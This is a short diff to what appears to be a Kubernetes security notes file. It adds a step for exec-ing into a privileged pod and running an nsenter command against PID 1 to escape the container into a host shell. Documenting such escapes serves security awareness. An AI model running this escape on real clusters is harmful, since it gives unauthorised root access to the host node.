@@ -44,6 +44,12 @@ spec:
       allowPrivilegeEscalation: true
 ```
 
+`kubectl exec -it POD_NAME -- sh` into the Pod and use `nsenter` to escape the container's namespace:
+
+```console 
+$ nsenter -t 1 -m -u -n -i sh
+```
+
 ## Role Label for Node objects
 
 The `node-role.kubernetes.io/` can take "anything" as a role.
